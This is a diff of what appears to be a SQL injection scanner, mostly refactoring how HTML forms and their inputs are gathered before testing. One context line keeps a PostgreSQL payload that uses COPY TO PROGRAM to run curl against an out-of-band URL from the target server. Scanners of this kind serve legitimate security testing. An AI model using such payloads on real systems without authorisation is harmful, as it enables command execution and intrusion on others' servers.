@@ -475,18 +475,36 @@ def scan_sqli(url, forms, delay, options=None, threads=None):
     with ThreadPoolExecutor(max_workers=threads) as executor:
         futures = []
 
+        flattened_forms = []
+        for f in forms:
+            if isinstance(f, list):
+                flattened_forms.extend(f)
+            else:
+                flattened_forms.append(f)
+
         # Submit form input tests
-        for form in forms:
-            action = form.get("action") or url
-            method = form.get("method", "get").lower()
-            target = urljoin(url, action)
-            # Extract inputs with values to preserve tokens (CSRF fix)
-            inputs = {}
-            for i in form.find_all(["input", "textarea", "select"]):
-                if i.get("name"):
-                    inputs[i.get("name")] = i.get(
-                        "value", "1"
-                    )  # Default to '1' if no value
+        for form in flattened_forms:
+            if hasattr(form, "find_all"):
+                action = form.get("action") or url
+                method = form.get("method", "get").lower()
+                target = urljoin(url, action)
+                # Extract inputs with values to preserve tokens (CSRF fix)
+                inputs = {}
+                for i in form.find_all(["input", "textarea", "select"]):
+                    if i.get("name"):
+                        inputs[i.get("name")] = i.get("value", "1")  # Default to '1' if no value
+            else:
+                action = form.get("action") or url
+                method = form.get("method", "get").lower()
+                target = urljoin(url, action)
+                inputs = {}
+                raw_inputs = form.get("inputs", [])
+                for i in raw_inputs:
+                    if isinstance(i, dict) and i.get("name"):
+                        inputs[i.get("name")] = i.get("value", "1")
+                if not inputs and raw_inputs and isinstance(raw_inputs[0], str):
+                    for i in raw_inputs:
+                        inputs[i] = "1"
 
             if not inputs:
                 continue
@@ -584,17 +602,36 @@ def scan_blind_sqli(url, forms, delay, options=None):
             f"'; copy (select '') to program 'curl {oob_url}'-- "
         ])
 
-    # Test forms for Blind SQLi
-    for form in forms:
-        action = form.get("action") or url
-        method = form.get("method", "get").lower()
-        target = urljoin(url, action)
+    flattened_forms = []
+    for f in forms:
+        if isinstance(f, list):
+            flattened_forms.extend(f)
+        else:
+            flattened_forms.append(f)
 
-        # Extract inputs with values
-        inputs = {}
-        for i in form.find_all(["input", "textarea", "select"]):
-            if i.get("name"):
-                inputs[i.get("name")] = i.get("value", "1")
+    # Test forms for Blind SQLi
+    for form in flattened_forms:
+        if hasattr(form, "find_all"):
+            action = form.get("action") or url
+            method = form.get("method", "get").lower()
+            target = urljoin(url, action)
+            # Extract inputs with values
+            inputs = {}
+            for i in form.find_all(["input", "textarea", "select"]):
+                if i.get("name"):
+                    inputs[i.get("name")] = i.get("value", "1")
+        else:
+            action = form.get("action") or url
+            method = form.get("method", "get").lower()
+            target = urljoin(url, action)
+            inputs = {}
+            raw_inputs = form.get("inputs", [])
+            for i in raw_inputs:
+                if isinstance(i, dict) and i.get("name"):
+                    inputs[i.get("name")] = i.get("value", "1")
+            if not inputs and raw_inputs and isinstance(raw_inputs[0], str):
+                for i in raw_inputs:
+                    inputs[i] = "1"
 
         if not inputs:
             continue
